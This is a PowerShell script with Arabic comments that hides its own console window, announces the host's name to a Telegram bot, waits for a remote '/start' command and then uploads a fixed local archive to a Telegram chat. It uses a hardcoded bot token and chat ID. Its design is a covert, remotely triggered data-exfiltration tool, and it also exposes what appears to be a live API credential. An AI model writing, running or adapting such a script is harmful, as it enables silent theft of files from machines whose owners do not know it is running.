# SilentTelegramUploader.ps1
# لتشغيله: powershell -ExecutionPolicy Bypass -File .\SilentTelegramUploader.ps1

# إخفاء نافذة PowerShell
$windowStyle = 'Hidden'
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# =========================
# CONFIGURATION
# =========================
$BOT_TOKEN = "8491959457:AAHptpEAhmlGPQqobkKtf1820XwIlPJSDZI"
$CHAT_ID = "-5235121974"
$TARGET_FILE = "D:\النسخ الاصلية للمنتجات.rar"

# =========================
# FUNCTIONS
# =========================

function Send-TelegramMessage {
    param(
        [string]$Text,
        [bool]$Silent = $true
    )
    
    try {
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        $body = @{
            chat_id = $CHAT_ID
            text = $Text
            disable_notification = $Silent
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10
    } catch {
        Write-Error "Failed to send message: $_"
    }
}

function Upload-File {
    param([string]$FilePath)
    
    $maxRetries = 10
    $file = Get-Item $FilePath
    $fileName = $file.Name
    $fileSize = $file.Length
    
    # إرسال رسالة البدء
    Send-TelegramMessage -Text "🚀 **بدء رفع الملف**`n📁 **الاسم:** $fileName`n📊 **الحجم:** $(Format-FileSize $fileSize)" -Silent $false
    
    for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
        try {
            # إعداد رابط التحميل
            $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
            
            # إعداد بارامترات الطلب
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            
            # قراءة الملف كبايتات
            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
            $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
            
            # بناء محتوى multipart/form-data
            $content = [System.Text.StringBuilder]::new()
            
            # إضافة chat_id
            $content.Append("--$boundary$LF")
            $content.Append("Content-Disposition: form-data; name=`"chat_id`"$LF$LF")
            $content.Append("$CHAT_ID$LF")
            
            # إضافة الملف
            $content.Append("--$boundary$LF")
            $content.Append("Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"$LF")
            $content.Append("Content-Type: application/octet-stream$LF$LF")
            
            # تحويل StringBuilder إلى بايتات
            $headerBytes = $enc.GetBytes($content.ToString())
            
            # إضافة نهاية الملف
            $footer = "$LF--$boundary--$LF"
            $footerBytes = $enc.GetBytes($footer)
            
            # دمج كل البايتات
            $bodyStream = [System.IO.MemoryStream]::new()
            $bodyStream.Write($headerBytes, 0, $headerBytes.Length)
            $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
            $bodyStream.Write($footerBytes, 0, $footerBytes.Length)
            $bodyStream.Position = 0
            
            # إرسال الطلب
            $headers = @{
                "Content-Type" = "multipart/form-data; boundary=$boundary"
            }
            
            $response = Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyStream -TimeoutSec 3600
            
            if ($response.ok -eq $true) {
                Send-TelegramMessage -Text "✅ تم رفع الملف بنجاح في المحاولة $attempt" -Silent $true
                return $true
            } else {
                Send-TelegramMessage -Text "⚠️ فشل المحاولة $attempt" -Silent $true
            }
        } catch {
            Send-TelegramMessage -Text "❌ خطأ في المحاولة $attempt : $($_.Exception.Message)" -Silent $true
            
            if ($attempt -eq $maxRetries) {
                return $false
            }
            
            # انتظار متزايد قبل إعادة المحاولة
            Start-Sleep -Seconds ($attempt * 5)
        }
    }
    
    return $false
}

function Format-FileSize {
    param([long]$SizeBytes)
    
    if ($SizeBytes -lt 1KB) { return "$SizeBytes B" }
    elseif ($SizeBytes -lt 1MB) { return "{0:F2} KB" -f ($SizeBytes / 1KB) }
    elseif ($SizeBytes -lt 1GB) { return "{0:F2} MB" -f ($SizeBytes / 1MB) }
    elseif ($SizeBytes -lt 1TB) { return "{0:F2} GB" -f ($SizeBytes / 1GB) }
    else { return "{0:F2} TB" -f ($SizeBytes / 1TB) }
}

function Test-File {
    param([string]$FilePath)
    
    if (-not (Test-Path $FilePath)) {
        return $false, "File does not exist"
    }
    
    $file = Get-Item $FilePath
    
    if ($file.Length -eq 0) {
        return $false, "File is empty"
    }
    
    if ($file.Length -gt 2GB) {
        return $false, "File exceeds 2GB limit"
    }
    
    return $true, "File is valid"
}

# =========================
# MAIN SCRIPT
# =========================

# إرسال رسالة بدء التشغيل
try {
    $hostname = $env:COMPUTERNAME
    $time = Get-Date -Format "yyyy-MM-dd hh:mm:ss"
    $startupMessage = @"
🤖 **البوت يعمل في الخلفية**
━━━━━━━━━━━━━━━━━━━━
🖥️ **الجهاز:** `$hostname`
⏰ **الوقت:** $time
━━━━━━━━━━━━━━━━━━━━
💡 **أرسل:** `/start` لرفع الملف
"@
    
    Send-TelegramMessage -Text $startupMessage -Silent $true
} catch {
    # تجاهل الأخطاء في رسالة البدء
}

# الانتظار للأمر /start
while ($true) {
    try {
        # الحصول على آخر التحديثات
        $url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates"
        $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 30
        
        if ($response.ok -eq $true) {
            foreach ($update in $response.result) {
                if ($update.message.text -eq "/start") {
                    # إرسال رسالة بدء الرفع
                    Send-TelegramMessage -Text "🔍 **جاري التحقق من الملف...**`n⏳ الرجاء الانتظار..." -Silent $false
                    
                    # التحقق من الملف
                    $isValid, $message = Test-File -FilePath $TARGET_FILE
                    
                    if (-not $isValid) {
                        Send-TelegramMessage -Text "❌ **خطأ في الملف**`n$message" -Silent $false
                    } else {
                        # الحصول على معلومات الملف
                        $file = Get-Item $TARGET_FILE
                        $fileSize = $file.Length
                        
                        Send-TelegramMessage -Text "✅ **تم العثور على الملف**`n📁 **الاسم:** `$($file.Name)`n📊 **الحجم:** $(Format-FileSize $fileSize)`n⏳ **جاري بدء الرفع...**" -Silent $false
                        
                        # رفع الملف
                        $success = Upload-File -FilePath $TARGET_FILE
                        
                        if ($success) {
                            Send-TelegramMessage -Text "🎉 **تم الرفع بنجاح!**`n📁 **الملف:** `$($file.Name)`n📊 **الحجم:** $(Format-FileSize $fileSize)" -Silent $false
                        } else {
                            Send-TelegramMessage -Text "❌ **فشل الرفع**`nالرجاء المحاولة مرة أخرى" -Silent $false
                        }
                    }
                    
                    # حذف التحديثات التي تمت معالجتها
                    $lastUpdateId = $update.update_id
                    $url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$($lastUpdateId + 1)"
                    Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 5 | Out-Null
                }
            }
        }
    } catch {
        # تجاهل الأخطاء في الحصول على التحديثات
    }
    
    # انتظار 5 ثوان قبل التحقق مرة أخرى
    Start-Sleep -Seconds 5
}